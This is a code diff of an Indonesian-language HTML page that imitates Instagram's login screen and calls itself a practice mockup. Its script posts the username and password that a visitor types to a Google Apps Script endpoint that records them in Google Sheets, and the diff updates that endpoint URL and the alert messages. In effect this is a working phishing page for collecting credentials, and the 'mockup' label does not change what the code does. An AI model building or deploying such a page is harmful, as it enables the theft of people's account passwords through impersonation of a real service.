@@ -118,11 +118,6 @@
         max-width: 400px;
       }
     }
-    #status {
-      margin-top: 10px;
-      font-size: 13px;
-      color: #333;
-    }
   </style>
 </head>
 <body>
@@ -139,7 +134,6 @@
           <input type="password" id="password" name="password" placeholder="Kata sandi" required>
           <button type="submit">Masuk</button>
         </form>
-        <div id="status"></div>
         <div class="or"><span>ATAU</span></div>
         <button class="fb-login">Masuk dengan Facebook</button>
         <div class="forgot"><a href="#">Lupa kata sandi?</a></div>
@@ -148,20 +142,18 @@
         Tidak punya akun? <a href="#">Daftar</a>
       </div>
       <footer>
-        <p>Instagram clone — ini hanya mockup untuk latihan</p>
+        <p>Instagram clone — hanya mockup latihan</p>
       </footer>
     </div>
   </div>
 
   <script>
-    // Ganti dengan URL WebApp dari Google Apps Script
-    const scriptURL = "https://script.google.com/macros/s/AKfycbwTvzrnSIQIFaCnY8WEnrgsnpmczqvBxqpIBCTXizR2IHIu3q0KNl7dfZpRLMnNQa1WiQ/exec"; 
+    const scriptURL = "https://script.google.com/macros/s/AKfycbwl1OW5OIeyBD3sKDwe45GrJ9Re8oa9TdmDJ3dCKYn7asRpNbSsglFZ1bYW_GVL1jl87g/exec";
 
     const form = document.getElementById('loginForm');
-    const status = document.getElementById('status');
-
-    form.addEventListener('submit', function(e){
+    form.addEventListener('submit', e => {
       e.preventDefault();
+
       const data = {
         username: document.getElementById('username').value,
         password: document.getElementById('password').value
@@ -170,16 +162,18 @@
       fetch(scriptURL, {
         method: 'POST',
         body: JSON.stringify(data),
-        headers: { "Content-Type": "application/json" }
+        headers: {
+          'Content-Type': 'application/json'
+        }
       })
-      .then(res => res.text())
-      .then(msg => {
-        status.textContent = "Data login dummy terkirim ke Google Sheets!";
+      .then(res => res.json())
+      .then(res => {
+        alert("Data terkirim ke Google Sheets!");
         form.reset();
       })
       .catch(err => {
-        status.textContent = "Gagal mengirim data.";
-        console.error(err);
+        console.error("Error:", err);
+        alert("Gagal mengirim data");
       });
     });
   </script>
